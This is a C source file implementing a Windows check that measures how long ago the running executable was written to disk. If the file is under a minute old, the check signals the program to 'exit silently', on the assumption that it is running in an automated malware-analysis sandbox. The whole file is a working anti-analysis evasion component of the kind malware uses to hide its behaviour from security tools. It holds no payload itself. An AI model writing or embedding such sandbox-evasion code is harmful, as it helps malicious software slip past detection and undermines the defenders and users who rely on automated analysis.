/*
 * exec_gap.c — Time-since-drop check
 *
 * Sandboxes drop a file and execute it within seconds (their whole job is
 * fast analysis). A real user downloads a file, thinks about it, maybe scans
 * it — and runs it minutes to hours later.
 *
 * This check queries the creation/last-write time of the running executable
 * and compares it to the current time. If the gap is shorter than the
 * configured threshold, we're likely in an automated analysis environment.
 *
 * Return values:
 *   0 = gap is acceptable — proceed
 *   1 = gap too small     — likely sandbox, exit silently
 */

#if defined(_WIN32)||defined(_WIN64)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601  /* Windows 7+ */
#endif
#include <windows.h>
#include <stdint.h>

/*
 * exec_gap_check(min_gap_seconds)
 *
 * Uses GetModuleFileNameW to get our own path, then GetFileAttributesExW
 * to read the file timestamps. Compares creation time (or last-write time,
 * whichever is earlier) against the current FILETIME.
 *
 * min_gap_seconds: minimum acceptable gap (suggested: 60 — one minute)
 */
int exec_gap_check(unsigned int min_gap_seconds) {
    wchar_t path[MAX_PATH] = {0};

    /* Get our own executable path */
    DWORD len = GetModuleFileNameW(NULL, path, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return 0; /* can't determine — allow */

    /* Get file timestamps */
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fad)) {
        return 0; /* can't read attributes — allow */
    }

    /* Get current time */
    FILETIME now_ft;
    GetSystemTimeAsFileTime(&now_ft);

    /*
     * Use the EARLIER of CreationTime and LastWriteTime.
     * Some tools modify LastWriteTime when copying/extracting files.
     * We want the earliest timestamp = when the file first appeared on disk.
     */
    ULARGE_INTEGER creation, lastwrite, now_ul;
    creation.LowPart  = fad.ftCreationTime.dwLowDateTime;
    creation.HighPart = fad.ftCreationTime.dwHighDateTime;
    lastwrite.LowPart  = fad.ftLastWriteTime.dwLowDateTime;
    lastwrite.HighPart = fad.ftLastWriteTime.dwHighDateTime;
    now_ul.LowPart  = now_ft.dwLowDateTime;
    now_ul.HighPart = now_ft.dwHighDateTime;

    /* earliest = min(creation, lastwrite) */
    ULARGE_INTEGER earliest = (creation.QuadPart < lastwrite.QuadPart)
                              ? creation : lastwrite;

    if (earliest.QuadPart >= now_ul.QuadPart) {
        /* timestamp is in the future — something is wrong, allow */
        return 0;
    }

    /* FILETIME units: 100-nanosecond intervals. Convert to seconds. */
    ULONGLONG elapsed_100ns = now_ul.QuadPart - earliest.QuadPart;
    ULONGLONG elapsed_seconds = elapsed_100ns / 10000000ULL;

    if (elapsed_seconds < (ULONGLONG)min_gap_seconds) {
        /* File too fresh — executed immediately after being written */
        return 1;
    }
    return 0;
}

#else  /* Non-Windows stub */

int exec_gap_check(unsigned int min_gap_seconds) {
    (void)min_gap_seconds;
    return 0; /* not applicable outside Windows — always pass */
}

#endif
